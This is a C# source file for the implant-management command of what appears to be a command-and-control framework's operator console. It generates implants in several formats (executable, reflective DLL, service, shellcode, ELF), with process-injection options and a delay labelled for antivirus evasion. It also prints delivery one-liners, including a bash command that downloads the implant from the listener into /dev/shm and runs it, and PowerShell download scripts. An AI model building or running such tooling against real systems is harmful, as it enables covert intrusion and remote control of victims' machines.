using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using Commander.Executor;
using Commander.Helper;
using Common.APIModels;
using Common.CommandLine.Core;
using Common.Payload;
using Shared;
using Spectre.Console;

namespace Commander.Commands
{
    public class ManageImplantCommandOptions : VerbCommandOption
    {
        [Argument("Verb", "actions available", 0, DefaultValue = CommandVerbs.Show, AllowedValues = new object[] { CommandVerbs.Show, "Download", "Generate", "Script", "Delete" }, IsRequired = true)]
        public override string verb { get; set; }
        [Option("n", "name", "Name of the Implant")]
        public string name { get; set; } // for delete, download, script

        // Generation options
        [Option("l", "listener", "Listener to connect to (for generate)")]
        public string listener { get; set; }
        [Option("b", "bind", "Endpoint URL (for generate, e.g. http://10.10.10.10:80)")]
        public string endpoint { get; set; }
        [Option("dl", "download", "Download implant after generation")]
        public bool download { get; set; }
        [Option("t", "type", "exe | dll | rfl | svc | ps | bin | elf", DefaultValue = "exe", AllowedValues = new object[] { "exe", "dll", "rfl", "svc", "ps", "bin", "elf" })]
        public string type { get; set; }
        [Option("a", "arch", "x64 | x86", DefaultValue = "exe", AllowedValues = new object[] { "x64", "x86" })]
        public string arch { get; set; }

        [Option("d", "debug", "generate implant in debug mode")]
        public bool debug { get; set; }

        //Injection options
        [Option("i", "inject", "If the payload should be an injector")]
        public bool inject { get; set; }

        [Option("id", "injectDelay", "Delay before injection (AV evasion)",DefaultValue =60)]
        public int injectDelay { get; set; }

        [Option("ipid", "injectProcessId", "Process Id used for injection", DefaultValue = null)]
        public int? injectProcessId { get; set; }

        [Option("ipn", "injectProcessName", "Process Name used for injection")]
        public string injectProcessName { get; set; }

        [Option("ips", "injectProcessSpawn", "Process Image path used for injection (spawn)")]
        public string injectSpawn { get; set; }
    }

    [Command("implant", "Manager TeamServer Listeners", Category = "Commander", Aliases = new string[] { "implants" } )]
    public class ManageImplantCommand : VerbCommand<CommanderCommandContext, ManageImplantCommandOptions>
    {
        protected override void RegisterVerbs()
        {
            this.Register(CommandVerbs.Show.ToString(), this.ShowImplants);
            this.Register("download", this.DownloadImplant);
            this.Register("generate", this.GenerateImplant);
            this.Register("delete", this.DeleteImplant);
            this.Register("script", this.GenerateScript);
        }

        private async Task<bool> ShowImplants(CommanderCommandContext context, ManageImplantCommandOptions options)
        {
            var implants = context.CommModule.GetImplants();
            if (implants == null || !implants.Any())
            {
                context.Terminal.WriteInfo("No implants found.");
                return true;
            }

            var table = new Spectre.Console.Table();
            table.AddColumn(new TableColumn("Name"));
            table.AddColumn(new TableColumn("Type"));
            table.AddColumn(new TableColumn("Arch"));
            table.AddColumn(new TableColumn("Endpoint"));
            table.AddColumn(new TableColumn("Listener"));
            table.AddColumn(new TableColumn("Injection"));

            foreach (var implant in implants)
            {
                var type = implant.Config?.Type.ToString() ?? "Unknown";
                var name = implant.Config?.ImplantName.ToString() ?? "Unknown";
                var arch = implant.Config?.Architecture.ToString() ?? "Unknown";
                var endpoint = implant.Config?.Endpoint?.ToString() ?? "Unknown";
                var listener = implant.Config?.Listener?.ToString() ?? "Custom";

                var injectionInfo = "None";
                if (implant.Config != null && implant.Config.IsInjected)
                {
                    var delay = implant.Config.InjectionDelay;
                    if (implant.Config.InjectionProcessId.HasValue)
                        injectionInfo = $"PID: {implant.Config.InjectionProcessId} ({delay}s)";
                    else if (!string.IsNullOrEmpty(implant.Config.InjectionProcessName))
                        injectionInfo = $"Name: {implant.Config.InjectionProcessName} ({delay}s)";
                    else if (!string.IsNullOrEmpty(implant.Config.InjectionProcessSpawn))
                        injectionInfo = $"Spawn: {implant.Config.InjectionProcessSpawn} ({delay}s)";
                    else
                        injectionInfo = $"Spawn: Default ({delay}s)";
                }

                table.AddRow(name, type, arch, endpoint, listener, injectionInfo);
            }

            context.Terminal.Write(table);
            return true;
        }

        private async Task<bool> GenerateImplant(CommanderCommandContext context, ManageImplantCommandOptions options)
        {
            var listenerName = options.listener;
            var endpointStr = options.endpoint;
            var typeStr = options.type;
            var archStr = options.arch;

            ConnexionUrl connexionUrl = null;

            var config = new ImplantConfig();
            config.IsDebug = options.debug;

            if(options.inject)
            {
                config.IsInjected = true;
                config.InjectionDelay = options.injectDelay;
                config.InjectionProcessId = options.injectProcessId;
                config.InjectionProcessName = options.injectProcessName;
                config.InjectionProcessSpawn = options.injectSpawn;
            }

            if (!string.IsNullOrEmpty(listenerName))
            {
                var listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.Equals(listenerName, StringComparison.OrdinalIgnoreCase));
                if (listener == null)
                {
                    context.Terminal.WriteError($"Listener '{listenerName}' not found.");
                    return false;
                }
                connexionUrl = ConnexionUrl.FromString(listener.EndPoint);
                config.Listener = listener.Name;
            }
            else if (!string.IsNullOrEmpty(endpointStr))
            {
                connexionUrl = ConnexionUrl.FromString(endpointStr);
                if (!connexionUrl.IsValid)
                {
                    context.Terminal.WriteError($"Invalid endpoint format: {endpointStr}. Expected format like tcp://host:port or http://host:port");
                    return false;
                }
            }
            else
            {
                context.Terminal.WriteError("Either listener or endpoint is required for generation.");
                return false;
            }


            config.Endpoint = connexionUrl;
            var type = ImplantType.Executable;
            switch (typeStr)
            {
                case "exe":
                    type = ImplantType.Executable; break;
                case "dll":
                    type = ImplantType.Library; break;
                case "rfl":
                    type = ImplantType.ReflectiveLibrary; break;
                case "svc":
                    type = ImplantType.Service; break;
                case "ps":
                    type = ImplantType.PowerShell; break;
                case "bin":
                    type = ImplantType.Shellcode; break;
                case "elf":
                    type = ImplantType.Elf; break;
                default:
                    type = ImplantType.Executable; break;
            }


            config.Type = type;

            if (Enum.TryParse<ImplantArchitecture>(archStr, true, out var archEnum))
                config.Architecture = archEnum;
            else
                config.Architecture = ImplantArchitecture.x64;

            try
            {
                context.Terminal.WriteInfo($"Generating {config.Architecture} {config.Type} implant for {config.Endpoint}...");
                var result = await context.CommModule.GenerateImplant(config);

                // For a freshly generated implant, we use the name from the config
                options.name = result.Implant.Name;
                if (options.download && result != null)
                {
                    await this.DownloadImplant(context, options);
                }

                await Script(result.Implant, context, options);
            }
            catch (Exception ex)
            {
                context.Terminal.WriteError($"Generation failed: {ex.Message}");
            }



            return true;
        }

        private async Task<bool> DownloadImplant(CommanderCommandContext context, ManageImplantCommandOptions options)
        {
            var name = options.name;
            if (string.IsNullOrEmpty(name))
            {
                context.Terminal.WriteError("Implant Name is required for download.");
                return false;
            }

            try
            {
                var implants = context.CommModule.GetImplants();
                var implantInfo = implants.FirstOrDefault(i => string.Equals(i.Config?.ImplantName, name, StringComparison.OrdinalIgnoreCase));

                if (implantInfo == null)
                {
                    context.Terminal.WriteError($"Implant with name '{name}' not found.");
                    return false;
                }

                context.Terminal.WriteInfo($"Downloading implant {name}...");
                var implant = await context.CommModule.GetImplantBinary(implantInfo.Id);

                if (string.IsNullOrEmpty(implant.Data))
                {
                    context.Terminal.WriteError("No data found for this implant.");
                    return false;
                }

                var data = Convert.FromBase64String(implant.Data);
                var fileName = PayloadGenerator.GetImplantFileName(implant.Config);


                var outPath = Path.Combine(Environment.CurrentDirectory, fileName);
                await File.WriteAllBytesAsync(outPath, data);
                context.Terminal.WriteSuccess($"Implant downloaded to {outPath}");
            }
            catch (Exception ex)
            {
                context.Terminal.WriteError($"Download failed: {ex.Message}");
            }
            return true;
        }


        private async Task<bool> DeleteImplant(CommanderCommandContext context, ManageImplantCommandOptions options)
        {
            var name = options.name;
            if (string.IsNullOrEmpty(name))
            {
                context.Terminal.WriteError("Implant Name is required for deletion.");
                return false;
            }

            var implants = context.CommModule.GetImplants();
            var implantInfo = implants.FirstOrDefault(i => string.Equals(i.Config?.ImplantName, name, StringComparison.OrdinalIgnoreCase));

            if (implantInfo == null)
            {
                context.Terminal.WriteError($"Implant with name '{name}' not found.");
                return false;
            }

            await context.CommModule.DeleteImplant(implantInfo.Id);
            context.Terminal.WriteSuccess($"Implant {name} deleted.");
            return true;
        }

        private async Task<bool> GenerateScript(CommanderCommandContext context, ManageImplantCommandOptions options)
        {
            var name = options.name;
            if (string.IsNullOrEmpty(name))
            {
                context.Terminal.WriteError("Implant Name is required for script generation.");
                return false;
            }

            var implants = context.CommModule.GetImplants();
            var selectedImplant = implants.FirstOrDefault(i => string.Equals(i.Config?.ImplantName, name, StringComparison.OrdinalIgnoreCase));

            if (selectedImplant == null)
            {
                context.Terminal.WriteError($"Implant {name} not found.");
                return false;
            }

            await Script(selectedImplant, context, options);
            return true;
        }

        private async Task Script(APIImplant selectedImplant, CommanderCommandContext context, ManageImplantCommandOptions options)
        {
            var listeners = context.CommModule.GetListeners();
            // Filter by listener if one is specified in the implant config
            if (!string.IsNullOrEmpty(selectedImplant.Config?.Listener))
            {
                listeners = listeners.Where(l => l.Name == selectedImplant.Config.Listener).ToList();
            }
            else if (!string.IsNullOrEmpty(options.listener))
            {
                listeners = listeners.Where(l => l.Name == options.listener).ToList();
            }

            if (!listeners.Any())
            {
                context.Terminal.WriteInfo("No compatible listeners found.");
            }

            foreach (var listener in listeners)
            {
                var protocol = listener.Secured ? "https://" : "http://";
                var listenerUrl = $"{protocol}{listener.Ip}:{listener.BindPort}";
                var isSecured = listener.Secured;
                var implantUrl = $"{listenerUrl}/imp/{selectedImplant.Config?.ImplantName}{GetFileExtension(selectedImplant.Config?.Type ?? ImplantType.Executable)}";
                var fileName = $"{selectedImplant.Config?.ImplantName}{GetFileExtension(selectedImplant.Config?.Type ?? ImplantType.Executable)}";

                context.Terminal.WriteInfo($"Listener: {listener.Name} ({listenerUrl})");

                if (selectedImplant.Config?.Type == ImplantType.PowerShell)
                {
                    context.Terminal.Write("PowerShell Script (Clear):");
                    context.Terminal.Write(ScriptHelper.GeneratePowershellScript(implantUrl, isSecured));
                    context.Terminal.WriteLine();

                    context.Terminal.Write("PowerShell Script (Base64):");
                    context.Terminal.Write(ScriptHelper.GeneratePowershellScriptB64(implantUrl, isSecured));
                    context.Terminal.WriteLine();
                }
                else if (selectedImplant.Config?.Type == ImplantType.Elf)
                {
                    var bashScript = $"curl -s -o /dev/shm/{selectedImplant.Config.ImplantName} {implantUrl} && chmod +x /dev/shm/{selectedImplant.Config.ImplantName} && /dev/shm/{selectedImplant.Config.ImplantName} &";
                    context.Terminal.Write("Bash Oneliner:");
                    context.Terminal.Write(bashScript);
                    context.Terminal.WriteLine();
                }
                else
                {
                    context.Terminal.Write("PowerShell Download Script:");
                    context.Terminal.Write(ScriptHelper.GeneratePowershellDownloadScript(implantUrl, fileName, isSecured));
                    context.Terminal.WriteLine();
                }

                context.Terminal.Write(new Rule());
            }
        }


        private string GetFileExtension(ImplantType type)
        {
            switch (type)
            {
                case ImplantType.Executable:
                case ImplantType.Service:
                    return ".exe";
                case ImplantType.PowerShell:
                    return ".ps1";
                case ImplantType.Elf:
                    return "";
                case ImplantType.Library:
                case ImplantType.ReflectiveLibrary:
                    return ".dll";
                default:
                    return ".bin";
            }
        }
    }
}
